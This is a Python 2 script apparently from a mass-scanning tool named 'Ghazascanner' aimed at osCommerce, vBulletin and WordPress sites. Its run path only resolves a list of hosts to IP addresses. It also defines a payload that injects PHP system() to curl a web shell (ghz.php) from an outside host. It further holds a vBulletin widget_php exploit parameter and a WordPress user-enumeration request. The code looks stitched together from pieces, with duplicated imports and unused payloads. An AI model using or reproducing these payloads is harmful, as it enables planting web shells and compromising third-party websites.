# -*- coding: utf-8 -*-
from __future__ import unicode_literals
#!/usr/bin/python

# Coded By Ghazascanner 
# Turkey

import sys,os,re,socket,binascii,time,json,random,threading,Queue,pprint,urlparse,smtplib,telnetlib,os.path,hashlib,string,urllib2,glob,sqlite3,urllib,argparse,marshal,base64,colorama,requests
from multiprocessing.dummy import Pool                             
from time import time as timer    
import time
from time import time as timer
from platform import system  
import urllib
import urllib3
from urllib import urlopen
from random import sample as rand
from Queue import Queue                           
from platform import system
from urlparse import urlparse
from optparse import OptionParser    
from colorama import Fore                                
from colorama import Style                                
from pprint import pprint                                
from colorama import init                                                
import traceback
from bs4 import BeautifulSoup
import subprocess
import warnings
from datetime import datetime
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)
reload(sys)  
sys.setdefaultencoding('utf8')                                              
init(autoreset=True) 
                                        
                                                            
####### Colors     ######    
    
fr  =   Fore.RED                                            
fc  =   Fore.CYAN                                            
fw  =   Fore.WHITE                                            
fg  =   Fore.GREEN                                            
sd  =   Style.DIM                                            
sn  =   Style.NORMAL                                        
sb  =   Style.BRIGHT                                        

####################### 
def logo():
    clear = "\x1b[0m"
    colors = [32]

    x = """

       _                                                        
      | |                                                       
  __ _| |__   __ _ ______ _ ___  ___ __ _ _ __  _ __   ___ _ __ 
 / _` | '_ \ / _` |_  / _` / __|/ __/ _` | '_ \| '_ \ / _ \ '__|
| (_| | | | | (_| |/ / (_| \__ \ (_| (_| | | | | | | |  __/ |   
 \__, |_| |_|\__,_/___\__,_|___/\___\__,_|_| |_|_| |_|\___|_|   
  __/ |\033[0;37;41m[WVS v 0.1 Special osCommerce,zenbot,vBulletin]\033[0;40m
 |___/                                                          

    \033[0;37;41m[ Coded by M4L1KL8590X ]
    \033[0;37;41m[ICQ:https://icq.im/greatzcode]
    \033[0;37;41m[Not responsible for any illegal usage of this tool.]
"""
    for N, line in enumerate(x.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.05)
logo()

start_raw = raw_input("\n\033[91mGhazascanner\033[97m:~# \033[97m")
crownes = raw_input("\033[91mthread \033[97m\033[97m:~# \033[97m")
try:
    with open(start_raw, 'r') as f:
        ooo = f.read().splitlines()
        ooo = list((ooo))
except IOError:
    print("open your eyes!")
        
squidwordsimpoles1 = {"routestring":"ajax/render/widget_php"}
squidwordsimpoles12 = {"routestring":"ajax/render/widget_php"}

Agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
user_agent = "Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3"
headersx = {'action':'woof_upload_ext','abspath':'data:,<?php system("curl https://raw.githubusercontent.com/boters/PythonBot/master/files/ghz.php -o ghz.php"); ?>'}


def enum(url):

    try:

        for i in range(5):
            enum = urllib.urlencode({'cs_uid': i, 'action': 'cs_employer_ajax_profile'})
            data = requests.post(url + "/wp-admin/admin-ajax.php", data=enum, headers=headers, verify=False)
            login = re.findall(r'name="display_name" value=\"(.*?)\"',str(data.content))
            for user in login:
                return user

    except Exception as Exx:
        print(Exx)
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0",
          "Accept": "*/*",
          "Accept-Language": "en-US,en;q=0.5",
          "Accept-Encoding": "gzip, deflate",
          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
          "X-Requested-With": "XMLHttpRequest",
          "Connection": "close"}

def rand_str (len = None) :
    if len == None :
        len = 8
    return ''.join (rand ('abcdefghijklmnopqrstuvwxyz', len))
    
def prepare(url, ua):
    try:
        global user_agent
        headers = {
            'User-Agent' : user_agent,
            'x-forwarded-for' : ua
        }
        cookies = urllib2.Request(url, headers=headers)
        result = urllib2.urlopen(cookies)
        cookieJar = result.info().getheader('Set-Cookie')
        injection = urllib2.Request(url, headers=headers)
        injection.add_header('Cookie', cookieJar)
        urllib2.urlopen(injection)
    except:
        pass
def toCharCode(string):
    try:
        encoded = ""
        for char in string:
            encoded += "chr({0}).".format(ord(char))
        return encoded[:-1]
    except:
        pass

class Master:
           

 
    def osrce(self,url):

        site = url.strip()
        try:
            if 'http://' not in site:
                IP1 = socket.gethostbyname(site)
                print "IP: "+IP1
                open('ips.txt', 'a').write(IP1+'\n')
            elif 'http://' in site:
                url = site.replace('http://', '').replace('https://', '').replace('/', '')
                IP2 = socket.gethostbyname(url)
                print "IP: "+IP2
                open('ips.txt', 'a').write(IP2+'\n')
    
        except:
            pass





BotMaster = Master()


def MyLove(url):
    
    try:
        if 'http' not in url:
            site = 'http://'+url
            url = 'http://'+url
            BotMaster.osrce(site)
        else:
            site = url
            BotMaster.osrce(site)
    except:
        pass




def Main():
    try:
        
        start = timer()
        ThreadPool = Pool(int(crownes))
        Threads = ThreadPool.map(MyLove, ooo)
    except:
        pass


if __name__ == '__main__':
    Main()
